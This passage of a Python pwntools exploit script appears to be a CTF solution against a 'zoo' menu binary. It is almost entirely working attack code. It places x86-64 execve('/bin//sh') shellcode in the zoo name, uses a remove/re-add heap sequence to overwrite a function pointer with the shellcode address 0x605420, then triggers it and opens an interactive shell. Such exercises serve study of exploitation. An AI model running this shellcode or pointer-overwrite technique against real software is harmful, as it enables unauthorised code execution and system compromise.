	p.recvuntil("choice :")
	p.sendline("1")
	p.recvuntil("Name : ")
	p.sendline(name)
	p.recvuntil("Weight : ")
	p.sendline(str(weight))

def addcat(name, weight):
	p.recvuntil("choice :")
	p.sendline("2")
	p.recvuntil("Name : ")
	p.sendline(name)
	p.recvuntil("Weight : ")
	p.sendline(str(weight))

def listen(index):
	p.recvuntil("choice :")
	p.sendline("3")
	p.recvuntil("animal : ")
	p.sendline(str(index))

def show(index):
	p.recvuntil("choice :")
	p.sendline("4")
	p.recvuntil("animal : ")
	p.sendline(str(index))

def remove(index):
	p.recvuntil("choice :")
	p.sendline("5")
	p.recvuntil("animal : ")
	p.sendline(str(index))
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

p.sendafter("Name of Your zoo :", shellcode + p64(0x605420))

adddog("dog1", 40)
adddog("dog2", 40)

remove(0)
adddog("a" * 0x8 * 9 + p64(0x605420 + len(shellcode)),40)
listen(0)
p.interactive()

```















